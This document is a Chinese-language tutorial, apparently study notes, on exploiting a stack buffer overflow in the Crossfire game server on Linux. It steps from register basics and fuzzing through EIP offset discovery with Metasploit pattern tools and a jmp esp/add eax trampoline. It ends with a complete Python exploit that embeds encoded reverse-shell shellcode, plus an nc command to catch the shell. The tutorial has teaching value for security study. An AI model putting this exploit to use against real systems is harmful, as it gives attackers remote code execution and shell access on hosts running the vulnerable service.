linux逆向工具：edb-debug
寄存器：
4个数据寄存器(EAX、EBX、ECX和EDX)
2个变址和指针寄存器(ESI和EDI)
2个指针寄存器(ESP和EBP)
EAX 是”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。
EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。
ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。
EDX 则总是被用来放整数除法产生的余数。
esp：寄存器存放当前线程的栈顶指针
ebp：寄存器存放当前线程的栈底指针
eip：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，
从EIP寄存器中读取下一条指令的内存地址，然后继续执行。

linux下缓冲区溢出的攻击原理：linux靶机服务器上运行一个服务，并开放一个端口，
攻击机获取到了这个服务的程序并获取到了靶机的IP地址和该服务的端口，
先在攻击机上通过逆向程序调试该服务程序，找到缓冲区溢出的漏洞，并
定位该漏洞的位置，然后通过编写python程序向靶机服务端口发送请求，
使靶机服务发生缓冲区溢出并执行发送的请求中包含的一段shellcode，
从而获取到靶机的最高权限。

溢出（buffer）：用户的输入长度超出栈中对它最大长度的预期，即分配的内存大小。
返回地址（ret）：用于直接跳转到栈顶部的4B的地址。
Padding（填充）：在shellcode之前的一系列NOP（无操作）指令，它使攻击者直接跳转到那里去的地址时，能放宽的精度要求。
只要他跳转到NOP链的任意地方，可直接划到shellcode那里。
shellcode：一小段用汇编语言编写的机器码。可以用Metasploit框架生成shellcode。

如何发现漏洞？
源码审计（代码审计），逆向工程（动态调试），模糊测试------
（向程序堆栈半随机的数据，根据内存变化判断溢出，数据生成器--生成随机，半随机数据，测试工具--识别溢出漏洞）

实例操作：
运行服务端程序
通过netstat -pantu 命令来获取该服务开放的端口和进程PID
运行edb对进程进行检测
运行第一个测试程序：
import socket
host = "127.0.0.1"
crash = "\x41" * 4379 crossfire必须在发送数值大小在一个固定数值的时候才能发生缓冲区溢出，只有当发送4379字符时，才能精确到溢出位置
buffer = "\x11(setup sound " +crash+ "\x90\x90#)"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327)) 端口号
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"
第一次测试后程序成功崩溃，得到的结果是发送4379个字符能使之发生溢出，然后重启服务并且用edb监测
使用第二个脚本：
将crash的值修改为
crash = "4379个不重复的字符组合"  # crash的值是大量的不重复的字母数字组合用于精确确定位置
输入./usr/share/metasploit-‐framework/tools/exploit/pattern_create.rb -l 4379 命令使之生成4379个有规律但不重复的字符串
用于精确确定溢出位置，添加到第二个脚本的crash中，运行。
edb弹出报错：46367046   ，该四个字符是4379个字符里面中的四个相连的字符
输入./usr/share/metasploit-‐framework/tools/exploit/pattern_offset.rb -q 46367046
[*] Exact match at offset 4368
得出精确位置在第4368个字符上 说明溢出时EIP里面的字符是第4368的字符
将crash的值修改为
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
运行脚本弹出发现EIP里面的值位42424242 对应 BBBB 说明第4369 4370 4371 4372 四个字符刚好在EIP的位置发生溢出
查看ESP寄存器里面有7个C，因为ESP只能添7个字符才能精确修改EIP，所以shellcode不能放在ESP寄存器中。
因此在剩下的寄存器中寻找逐个查找，发现EAX可用
因为setup sound为服务器指令，所以前十二个字符须先发送（setup sound ）
存在一个理论，直接在EAX的地址上加上12，可实现跳转，但是很大可能换一台机器后可能无法实现溢出，因为不同系统的EAX地址可能不一样
第一阶段shellcode：从ESP【7个字节】 跳转到 EAX，在ESP中实现偏移12位字符
\x83\xc0\x0c\xff\xe0\x90\x90
add  eax  12 jmp eax nul nul
给EAX添加12个字符 并跳转到eax
获取以上7个字节需要输入./usr/share/metasploit-framework/tools/exploit#/nasm_shell.rb
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
获取到 83C00CFFE0 将之转换为\x83\xc0\x0c\xff\xe0在后面加两个跳转字符,防止被过滤（计算机读入数据顺序与人类阅读顺序相反）
将crash更改为crash = "\x41" * 4368 + "B" * 4 + "\x83\xc0\x0c\xff\xe0\x90\x90"
运行脚本可以看到
ffbd:6438 41414141
ffbd:643c 42424242
ffbd:6440 ff0cc083
ffbd:6444 909090e0
接下来重新启动服务使用edb的工具opcode search 查找该服务中第一条ESP->EIP（jmp esp）的16进制字符
得到该程序第一条ESP->EIP的地址是08134597
将该字符添加到EIP中，使之执行EIP->ESP 中 ESP中含有add eax,12 jmp eax 使EAX偏移12个字符并且跳转到EAX中
然后可以吧EAX中的一些字符A替换成shellcode，该12个字符对应（setup sound ）为服务器的指令所以需要偏移12个字符
给指令留出位置
查找出shellcode中不能使用的坏字符：\x00\x0a\x0d\x20
修改crash：crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90" （计算机读入数据顺序与人类阅读顺序相反）
          内存中的地址方向是反的-> 08134597 【EIP】       add eax,12 jmp eax【EAX】
重新启动服务在服务暂停的时候设置断点0x08134597启动服务，运行脚本
运行后发现程序在jmp esp处暂停 按F8看到程序下一步在 add eax,12处暂停 继续下一步 在jmp eax处暂停
接下来就是生成shellcode
root@kali:/usr/share/framework2# ./msfpayload linux_ia32_reverse LHOST=127.0.0.1 LPORT=4444 R | ./msfencode -b "\x00\x0a\x0d\x20"
#!/usr/bin/python

import socket

host = "127.0.0.1"

shellcode = (
"\xbb\x6d\x65\x9b\xcd\xdb\xdd\xd9\x74\x24\xf4\x5f\x2b\xc9"+
"\xb1\x14\x83\xc7\x04\x31\x5f\x10\x03\x5f\x10\x8f\x90\xaa"+
"\x16\xb8\xb8\x9e\xeb\x15\x55\x23\x65\x78\x19\x45\xb8\xfa"+
"\x01\xd4\x10\x92\xb7\xe8\x85\x3e\xd2\xf8\xf4\xee\xab\x18"+
"\x9c\x68\xf4\x17\xe1\xfd\x45\xac\x51\xf9\xf5\xca\x58\x81"+
"\xb5\xa2\x05\x4c\xb9\x50\x90\x24\x85\x0e\xee\x38\xb0\xd7"+
"\x08\x50\x6c\x07\x9a\xc8\x1a\x78\x3e\x61\xb5\x0f\x5d\x21"+
"\x1a\x99\x43\x71\x97\x54\x03")

crash = shellcode + "A"*(4368-105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " +crash+ "\x90\x90#)"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"

#打开侦听4444端口【当有人连接4444的时候，则getshell】

nc  127.0.0.1 4444 ###获得shell